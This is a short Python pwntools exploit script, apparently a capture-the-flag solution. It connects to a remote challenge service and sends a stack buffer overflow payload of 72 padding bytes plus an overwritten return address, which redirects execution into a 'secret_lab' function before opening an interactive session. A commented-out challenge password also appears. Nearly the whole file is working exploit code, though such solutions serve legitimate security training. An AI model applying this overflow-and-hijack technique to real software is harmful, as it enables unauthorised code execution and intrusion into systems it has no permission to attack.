#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall") 
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.35.so")

context.update(os = "linux", arch = "amd64", log_level = "debug", binary = exe)

# p = process(exe.path)
p = remote("183.91.11.30", 1969)

sl  = p.sendline
sa  = p.sendafter
sla = p.sendlineafter
rl  = p.recvline
ru  = p.recvuntil

def GDB():
    gdb.attach(p, gdbscript = """
        b*0x4014f3
        continue
    """)
    pause() 

# GDB()

# 0x40135a
seceret_lab = exe.symbols["secret_lab"] 
ret = 0x401549
payload = b"A" * 72 + p64(seceret_lab + 120) 

sla("choice: ", b"1")
sla("coordinates: ", payload)
# sla("password: ", b"qu4ntumR3ality")

p.interactive() 